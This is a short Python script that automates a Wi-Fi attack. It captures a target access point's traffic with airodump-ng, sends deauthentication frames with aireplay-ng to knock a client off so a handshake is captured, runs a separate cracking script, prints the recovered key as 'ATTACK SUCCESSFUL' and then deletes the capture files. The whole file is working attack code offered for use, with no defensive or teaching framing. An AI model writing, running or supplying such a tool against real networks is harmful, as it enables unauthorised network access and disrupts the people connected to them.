import subprocess
import os
import threading
import time
import signal

def logPackets(channel,APMAC,ClientMAC):
    def deauthFunc(APMAC,ClientMAC):
        cmd = f"sudo aireplay-ng --deauth 1 -a {APMAC} -c {ClientMAC} wlan0mon"
        os.system(cmd)
        return 0
    def cleanup():
        cmd = "sudo rm hack1-01.*"
        os.system(cmd)
    def crack():
        os.system("./crack.sh")
        os.system("clear")
        with open("key.txt","r") as f:
            key = f.read()
            print("ATTACK SUCCESSFUL\nTHE KEY IS ",key)

    PID = subprocess.Popen(["airodump-ng","-w","hack1","-c",f"{channel}","--bssid",f"{APMAC}","wlan0mon"],shell=False)
    time.sleep(5)
    
    
    t1 = threading.Thread(target=deauthFunc,args=[APMAC,ClientMAC])
    t1.start() #Start Deauthing
    time.sleep(10)
    t1.join()
    PID.send_signal(signal.SIGINT)
    crack()
    cleanup()